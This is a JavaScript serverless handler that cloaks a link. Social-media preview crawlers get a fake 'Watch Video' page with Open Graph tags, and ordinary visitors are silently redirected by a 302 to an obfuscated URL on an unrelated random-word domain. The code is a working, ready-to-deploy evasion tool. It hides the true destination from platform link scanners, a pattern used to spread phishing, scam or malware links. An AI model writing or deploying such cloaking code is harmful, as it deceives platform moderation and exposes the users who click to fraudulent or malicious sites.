export default function handler(req, res) {
  const destination =
    "https://racialburgerdiverse.com/aTaSNCE/uqyRt0iQfhydeC/fHCl9FLT5Zmw8jmUXg/ZMti/7eVhND2_-eDT7qqOa/SYxIynafGezyg4FJId0Z/PYw4_r2nOYra/sCNyOaSi/vu5-/2yEt/v2pJjdYDjwd89NX27/hIs";

  const previewImage =
    "https://pub-700ffbe441c8473ea3de42cad7beccff.r2.dev/3478783601556556429.gif";

  const ua = (req.headers["user-agent"] || "").toLowerCase();

  const crawlers = [
    "facebookexternalhit",
    "facebot",
    "twitterbot",
    "linkedinbot",
    "pinterest",
    "slackbot",
    "discordbot",
    "telegrambot",
    "whatsapp"
  ];

  const isCrawler = crawlers.some(bot => ua.includes(bot));

  if (isCrawler) {
    const html = `<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">

  <title>Watch Video</title>

  <meta property="og:title" content="Watch Video">
  <meta property="og:description" content="Watch this video">
  <meta property="og:image" content="${previewImage}">
  <meta property="og:image:type" content="image/gif">
  <meta property="og:type" content="website">

  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="Watch Video">
  <meta name="twitter:description" content="Watch this video">
  <meta name="twitter:image" content="${previewImage}">
</head>
<body></body>
</html>`;

    res.status(200);
    res.setHeader("Content-Type", "text/html; charset=utf-8");
    res.setHeader("Cache-Control", "no-store");
    return res.end(html);
  }

  // Normal visitors get a real HTTP 302
  res.status(302);
  res.setHeader("Location", destination);
  res.setHeader("Cache-Control", "no-store");
  return res.end();
}
